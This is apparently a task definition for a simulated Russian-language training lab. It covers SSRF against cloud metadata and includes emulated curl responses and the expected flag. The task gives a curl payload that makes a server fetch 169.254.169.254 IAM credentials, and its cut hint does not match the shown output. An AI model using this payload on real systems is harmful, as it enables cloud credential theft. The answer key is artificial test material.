@@ -1,0 +1,37 @@
+{
+  "id": "web-ssrf",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: SSRF до облачных метаданных\n\nЦель — `http://vuln.lab.local/fetch?url=`. Сервер сам ходит по указанному URL\n(прокси). Это SSRF: можно заставить его обратиться к внутреннему адресу.\n\n1. Обычный запрос: `curl -s -G http://vuln.lab.local/fetch --data-urlencode 'url=http://example.com/'`.\n2. Адрес облачных метаданных AWS — `169.254.169.254`. Попроси роль:\n\n   curl -s -G http://vuln.lab.local/fetch --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n\n3. В ответе — временные ключи и токен (там флаг). Достань `cut -d: -f6`, запиши в `found.txt`, набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция vuln.lab.local/fetch)",
+      "cases": [
+        {
+          "match": "169\\.254\\.169\\.254",
+          "example": "-s -G http://vuln.lab.local/fetch --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
+          "output": "{\"Code\":\"Success\",\"Type\":\"AWS-HMAC\",\"AccessKeyId\":\"ASIAEXAMPLE\",\"SecretAccessKey\":\"wJalrXUtnFEMI/K7MDENG\",\"Token\":\"nto{169_254_169_254_1s_my_h0m3}\"}\n"
+        },
+        {
+          "match": "url=",
+          "example": "-s -G http://vuln.lab.local/fetch --data-urlencode 'url=http://example.com/'",
+          "output": "{\"error\":\"blocked\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /fetch на vuln.lab.local.\n"
+    }
+  },
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{169_254_169_254_1s_my_h0m3}"
+  }
+}
